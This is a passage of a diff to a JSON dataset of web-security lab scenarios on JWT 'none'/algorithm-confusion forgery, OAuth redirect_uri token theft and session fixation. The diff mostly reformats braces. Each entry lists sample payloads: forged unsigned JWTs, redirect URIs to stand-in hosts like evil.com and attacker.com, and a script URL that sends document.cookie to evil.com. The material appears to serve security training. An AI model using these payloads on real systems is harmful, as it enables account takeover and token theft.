       "https://vulnerable-app.com/auth?client_id=123&redirect_uri=https://attacker.site/capture&response_type=token",
       "Authorization: Bearer token-carlos-abc123"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "JWT algorithm confusion vulnerability in session validation",
     "Lab Description": "This lab implements JWT-based authentication using the `alg` field in the token header to determine the algorithm dynamically. The application fails to properly validate this value, allowing an attacker to forge a valid token using `alg: none`. To solve: Forge a token that grants access to Carlos’s account using algorithm confusion.",
     "Difficulty Level": "Medium",
@@ -1371,9 +1316,8 @@
       "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0.",
       "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIn0"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "OAuth redirect manipulation for token leakage",
     "Lab Description": "This lab integrates third-party OAuth for login and uses the `redirect_uri` parameter to navigate users post-authentication. The application fails to validate this URI properly. To solve: Manipulate the redirect_uri to leak Carlos's OAuth token to your controlled server.",
     "Difficulty Level": "Hard",
@@ -1391,9 +1335,8 @@
       "https://evil.com?code={authCode}",
       "https://evil.com/callback?token={accessToken}"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "Session fixation vulnerability in login flow",
     "Lab Description": "The application assigns session tokens before authentication and does not generate a new session upon successful login. This allows an attacker to fix a session ID for a victim. To solve: Set a session ID, trick Carlos into logging in, then reuse the same session ID to access his account.",
     "Difficulty Level": "Hard",
@@ -1411,9 +1354,8 @@
       "Set-Cookie: session=fixatedSession123",
       "GET /my-account HTTP/1.1\nCookie: session=fixatedSession123"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "JWT signature bypass in stateless session handling",
     "Lab Description": "This lab demonstrates a JWT validation flaw caused by the server not verifying the token's algorithm. The application accepts JWTs as bearer tokens to manage authentication. However, it does not verify whether the signature algorithm is secure. To solve: Modify and forge a JWT token that grants access to Carlos’s protected account page without knowing the original secret.",
     "Difficulty Level": "Hard",
@@ -1431,9 +1373,8 @@
       "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
       "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "OAuth misconfiguration via open redirect abuse",
     "Lab Description": "The application integrates with a third-party OAuth provider for authentication. Due to poor redirect URI validation, it is vulnerable to open redirect abuse, allowing attackers to intercept authorization codes. To solve: Exploit the misconfigured redirect URI to capture Carlos's OAuth token and access his account page.",
     "Difficulty Level": "Medium",
@@ -1451,9 +1392,8 @@
       "https://target.com/auth/redirect?next=https://evil.com/oauth/code",
       "https://target.com/auth/redirect?next=data:text/html,<script>location='http://evil.com?c='+document.cookie</script>"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "Session fixation via predictable session tokens",
     "Lab Description": "This lab uses predictable session tokens vulnerable to fixation. The server does not regenerate session identifiers upon authentication, allowing an attacker to set a known token and trick a victim into using it. To solve: Set a session token, trick Carlos into logging in with it, then reuse the token to access his account page.",
     "Difficulty Level": "Hard",
@@ -1471,9 +1411,8 @@
       "sess_1701234567890",
       "sess_1699999999999"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "JWT signature spoof using 'none' algorithm",
     "Lab Description": "This lab is vulnerable to JWT tampering due to improper validation of the token algorithm field. The application accepts tokens signed using the 'none' algorithm without verifying their authenticity. To solve: forge a token that grants administrative access to Carlos’s account without knowing the signing secret.",
     "Difficulty Level": "Medium",
@@ -1529,8 +1468,7 @@
       "POST /login with session=attack-session and Carlos credentials",
       "GET /my-account with Cookie: session=attack-session"
     ]
-  }
-  ,
+  },
   {
     "Lab scenario": "JWT tampering vulnerability in Authorization Header",
     "Lab Description": "This lab has an authentication mechanism based on JWTs which are stored and verified insecurely. The application decodes the JWT but fails to validate its signature. This allows a user to modify the token payload and gain unauthorized access. To solve: Tamper with a JWT to escalate privileges and access the admin panel.",
@@ -1549,9 +1487,8 @@
       "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
       "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "Session fixation via predictable session ID in Cookie",
     "Lab Description": "This lab's session management is vulnerable due to the use of predictable session identifiers that are not regenerated after login. The application uses static session tokens which remain valid after authentication, allowing an attacker to fix a session ID for the victim. To solve: Set a known session ID, trick the victim into logging in, then hijack the session and access the account page.",
     "Difficulty Level": "Hard",
@@ -1569,9 +1506,8 @@
       "session=sharedToken42",
       "session=testsession001"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "OAuth misconfiguration vulnerability in redirect_uri",
     "Lab Description": "This lab features a misconfigured OAuth flow that fails to validate redirect_uri strictly, allowing an attacker to intercept tokens by exploiting open redirect behavior. The application integrates with an OAuth provider for authentication. To solve: Exploit the misconfiguration to capture Carlos’s access token via an attacker-controlled domain.",
     "Difficulty Level": "Medium",
@@ -1589,9 +1525,8 @@
       "https://vulnerable.app/oauth/authorize?redirect_uri=https://attacker.com/oauth-callback",
       "https://vulnerable.app/oauth/authorize?redirect_uri=https://attacker.com/redirect&state=xyz"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "JWT tampering to escalate privileges in API access",
     "Lab Description": "This lab features a RESTful API that uses JWTs for authentication. The backend accepts unsigned JWTs due to a missing verification check. The application uses the 'role' claim to restrict access to administrative endpoints. To solve: forge a JWT granting admin access and retrieve the sensitive data from the /admin/report endpoint.",
     "Difficulty Level": "Medium",
@@ -1608,9 +1543,8 @@
       "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
       "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9."
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "Session fixation in login redirection flow",
     "Lab Description": "The application uses a session cookie to manage authenticated users, but fails to issue a new session identifier upon successful login. An attacker can preset a session ID for the victim, then trick them into authenticating with it. To solve: hijack Carlos’s session by forcing him to log in using a fixed session ID.",
     "Difficulty Level": "Hard",
@@ -1628,9 +1562,8 @@
       "/login?username=carlos&password=secret123",
       "/my-account with Cookie: session=attacker123"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "OAuth implicit flow token leakage via referrer header",
     "Lab Description": "The application uses an OAuth 2.0 implicit flow and places access tokens in the URL fragment. However, a redirect to a third-party domain causes the access token to leak via the Referer header. To solve: capture Carlos’s token via a malicious redirect and use it to access his data.",
     "Difficulty Level": "Hard",
@@ -1648,9 +1581,8 @@
       "Referer: https://target.com/oauth/callback#access_token=carlos-access-token",
       "Authorization: Bearer carlos-access-token"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "JWT algorithm confusion vulnerability in login endpoint",
     "Lab Description": "The application's login mechanism uses JSON Web Tokens for session management but fails to validate the algorithm field properly. The application blindly trusts tokens signed with 'none' as valid. To solve: gain access to Carlos's account by forging a valid token without knowing the secret.",
     "Difficulty Level": "Easy",
@@ -1667,9 +1599,8 @@
       "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
       "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "OAuth implicit flow token leakage via redirect URI",
     "Lab Description": "This lab's OAuth implementation uses an implicit grant flow that leaks the access token in the redirect URI. The application does not sanitize or securely handle fragment identifiers, allowing an attacker to steal tokens via referer headers. To solve: extract Carlos's token and use it to access his protected profile.",
     "Difficulty Level": "Medium",
@@ -1686,9 +1617,8 @@
       "https://attacker.com/callback#access_token=carlos-oauth-token-abc123",
       "Authorization: Bearer carlos-oauth-token-abc123"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "Session fixation vulnerability in change-password endpoint",
     "Lab Description": "The application assigns a new session cookie upon login, but the session is not properly regenerated after sensitive operations. This allows an attacker to fix a session ID before victim login. To solve: set a session for Carlos before he logs in and hijack his session after he changes his password.",
     "Difficulty Level": "Hard",
@@ -1707,9 +1637,8 @@
       "POST /login with sid=attackerfixed123",
       "POST /change-password with sid=attackerfixed123"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "JWT None Algorithm Bypass in Authorization Header",
     "Lab Description": "This lab demonstrates a misconfigured JWT validation mechanism where the application fails to verify token signatures if the algorithm is set to 'none'. The application trusts JWTs from the Authorization header for user session validation. To solve: Forge a JWT for the admin user by modifying the algorithm to 'none' and access the admin dashboard.",
     "Difficulty Level": "Medium",
@@ -1767,8 +1696,7 @@
       "POST /oauth/token with code=authcode-carlos",
       "Authorization: Bearer token-carlos"
     ]
-  }
-  ,
+  },
   {
     "Lab scenario": "JWT tampering via 'none' algorithm in Authorization header",
     "Lab Description": "This lab implements stateless authentication using JWTs passed in the Authorization header. The backend fails to validate the algorithm used in the JWT header. The application trusts any token as long as the signature structure is present. To solve: Forge a JWT that grants access to Carlos’s account using the 'none' algorithm.",
@@ -1786,9 +1714,8 @@
       "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
       "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "Open redirect abuse in OAuth flow for token theft",
     "Lab Description": "The lab uses OAuth to authenticate users via a third-party provider. The 'redirect_uri' parameter is not properly validated, allowing attackers to intercept the access token after successful login. To solve: Capture the access token issued to Carlos by abusing the redirect_uri.",
     "Difficulty Level": "Hard",
@@ -1806,9 +1733,8 @@
       "https://attacker.com/callback#access_token=token123_for_carlos",
       "Authorization: Bearer token123_for_carlos"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "Session fixation using static token in cookie",
     "Lab Description": "The app issues session cookies with predictable static values tied to usernames, and fails to regenerate sessions on login. Attackers can set a valid cookie before login, leading to session fixation. To solve: Fix Carlos’s session, then use the token to access his account.",
     "Difficulty Level": "Hard",
@@ -1826,9 +1752,8 @@
       "https://vuln-app.com/login?username=carlos",
       "Set-Cookie: session=carlos_token"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "JWT algorithm confusion in REST API authentication",
     "Lab Description": "The backend uses JSON Web Tokens (JWT) for stateless authentication and incorrectly accepts tokens signed with 'none' algorithm. The application fails to validate the token signature properly, allowing attackers to forge tokens. To solve: Forge an admin JWT and access the /admin/dashboard endpoint.",
     "Difficulty Level": "Hard",
@@ -1846,9 +1771,8 @@
       "{alg: 'none', payload: { username: 'carlos', role: 'admin' }}",
       "Authorization: Bearer <forged-jwt>"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "Session fixation via predictable session IDs",
     "Lab Description": "The application assigns session tokens before authentication and fails to regenerate them post-login. This allows attackers to fix a session ID for the victim and hijack the session. To solve: Fix a session for Carlos, let him authenticate, then access his account page.",
     "Difficulty Level": "Medium",
@@ -1867,9 +1791,8 @@
       "POST /login with body: username=carlos&password=letmein",
       "GET /my-account with Cookie: sessionid=fixed123"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "OAuth redirect URI manipulation",
     "Lab Description": "The OAuth flow accepts a wide range of redirect URIs without strict validation. This allows an attacker to inject malicious domains to capture authorization codes. To solve: Exploit the open redirect to capture Carlos’s OAuth token and log in as him.",
     "Difficulty Level": "Hard",
@@ -1888,9 +1811,8 @@
       "POST /oauth/token with body: code=auth123",
       "Authorization: Bearer token-for-carlos"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "JWT tampering via 'none' algorithm",
     "Lab Description": "This lab implements JWT-based session management using insecure algorithm validation. The application accepts JWTs from authenticated users, but fails to enforce proper signature validation. To solve: Tamper with the JWT to impersonate Carlos and access his account.",
     "Difficulty Level": "Medium",
@@ -1908,9 +1830,8 @@
       "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9",
       "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "Session fixation via predictable session ID",
     "Lab Description": "This lab's session management is flawed due to predictable session tokens assigned before login. The application issues a session cookie before authentication and fails to regenerate it after successful login. To solve: Fixate a known session on Carlos and reuse it post-login to access his account.",
     "Difficulty Level": "Hard",
@@ -1928,9 +1849,8 @@
       "Set-Cookie: sessionid=known-value",
       "Simulated POST /login with sessionid=known-value and carlos credentials"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "OAuth implicit flow redirect URI manipulation",
     "Lab Description": "This lab uses OAuth 2.0 implicit flow, but its redirect URI validation is poorly implemented. The redirect URI can be manipulated to leak the access token to an attacker-controlled domain. To solve: Steal Carlos’s access token using an open redirect and access his profile.",
     "Difficulty Level": "Hard",
@@ -1948,9 +1868,8 @@
       "https://vulnerable-site.com/auth?redirect_uri=https://attacker.com/#access_token=",
       "Authorization: Bearer carlos-token-abc123"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "JWT algorithm confusion leading to authentication bypass",
     "Lab Description": "The authentication mechanism uses JSON Web Tokens (JWTs) for session management. However, it fails to verify the signing algorithm properly, allowing an attacker to forge tokens by switching the algorithm to 'none'. The application accepts unsigned JWTs if the alg field is tampered. To solve: forge a valid token and access Carlos's account page without valid credentials.",
     "Difficulty Level": "Medium",
@@ -2004,8 +1923,7 @@
       "GET /login HTTP/1.1\nHost: vulnerable-app.com\nCookie: sid=abc123",
       "GET /my-account HTTP/1.1\nHost: vulnerable-app.com\nCookie: sid=abc123"
     ]
-  }
-  ,
+  },
   {
     "Lab scenario": "JWT algorithm confusion attack in stateless API authentication",
     "Lab Description": "This lab's stateless JWT-based authentication system is vulnerable to an algorithm confusion flaw. The server uses RS256 for verifying JWTs, but it accepts tokens signed with HS256 if manipulated correctly. The application blindly trusts the 'alg' field in the JWT header. To solve: forge a valid JWT that grants access to Carlos's account.",
@@ -2024,9 +1942,8 @@
       "Modified header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}",
       "Signed using HMAC with public key as secret"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "Session fixation in classic web login flow",
     "Lab Description": "The application fails to invalidate the user's session upon successful login, making it vulnerable to session fixation. The attacker can set a session identifier before the victim logs in, and the application continues using the same session after authentication. To solve: Fix a session ID, trick Carlos to log in, and then use the session ID to access his account.",
     "Difficulty Level": "Medium",
@@ -2044,8 +1961,7 @@
       "Crafted POST /login request with known user credentials and fixed session cookie",
       "GET /my-account with same session ID reused after victim login"
     ]
-  }
-  ,
+  },
   {
     "Lab scenario": "OAuth misconfiguration leaking tokens via redirect",
     "Lab Description": "The OAuth implementation of this app leaks access tokens via an open redirect vulnerability after authorization. The redirect_uri parameter is not properly validated, allowing attackers to capture tokens sent via URL fragments. To solve: Trick the authorization server into sending Carlos's token to your controlled endpoint.",
@@ -2064,9 +1980,8 @@
       "OAuth URL: /authorize?redirect_uri=https://attacker.com/callback&user=carlos",
       "Authorization header: Bearer token_xxxxxx"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "JWT algorithm confusion in login authentication",
     "Lab Description": "The application uses JWTs to manage user sessions. However, it improperly trusts the 'alg' field from user-supplied tokens without validating the signature. The application accepts tokens where 'alg' is set to 'none'. To solve: forge a valid token for the admin user and access the protected admin dashboard.",
     "Difficulty Level": "Medium",
@@ -2083,9 +1998,8 @@
       "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
       "{ \"alg\": \"none\" }.{ \"username\": \"admin\" }."
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "Open redirect flaw in OAuth redirect_uri parameter",
     "Lab Description": "This lab implements OAuth login flow using a third-party provider. The `redirect_uri` parameter is improperly validated, allowing redirection to arbitrary domains. To solve: intercept the OAuth flow and steal an access token via redirection to a malicious endpoint under your control.",
     "Difficulty Level": "Hard",
@@ -2103,9 +2017,8 @@
       "https://malicious.site/steal?access_token=1234567890abcdef",
       "redirect_uri=https://attacker.com/receive"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "Session fixation vulnerability in authentication process",
     "Lab Description": "The login endpoint does not issue a new session identifier after successful authentication. This allows an attacker to fix a session ID before login and hijack the user session afterward. To solve: fix a session ID, get the victim to log in using it, then access their account using the same session.",
     "Difficulty Level": "Medium",
@@ -2123,9 +2036,8 @@
       "GET /login with predefined cookie",
       "Cookie: session=abcd1234"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "Session fixation via MFA token reuse in REST login flow",
     "Lab Description": "The application uses a RESTful login flow with 2FA implemented through a token verification endpoint. However, the token is bound to the session in an insecure way. The application reuses the 2FA token without revalidating the session context, allowing an attacker to hijack a victim's session post-authentication. To solve: Fixate your session during pre-authentication and inject a valid 2FA token generated by the victim to gain access to their account.",
     "Difficulty Level": "Hard",
@@ -2142,9 +2054,8 @@
       "{\"username\":\"carlos\"}",
       "{\"username\":\"carlos\",\"token\":\"112233\"}"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "OAuth implicit flow token theft via redirect URI manipulation",
     "Lab Description": "The application integrates with a third-party OAuth provider using the implicit flow, but does not properly validate redirect URIs. This allows an attacker to inject a malicious redirection target and capture the access token from the URL fragment. To solve: Exploit the OAuth flow to extract Carlos’s access token and use it to access his private user dashboard.",
     "Difficulty Level": "Medium",
@@ -2161,9 +2072,8 @@
       "https://malicious.example.com/#access_token=carlos:token123",
       "Authorization: Bearer Y2FybG9zOnRva2VuMTIz"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "JWT signature validation bypass using 'none' algorithm",
     "Lab Description": "The application uses JWT for session management. However, it incorrectly accepts tokens with the 'alg':'none' header and skips signature verification. An attacker can forge a token and impersonate any user. To solve: Create a tampered token that impersonates the admin user and access the protected admin panel.",
     "Difficulty Level": "Easy",
@@ -2181,5 +2091,4 @@
       "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
     ]
   }
-  
 ]
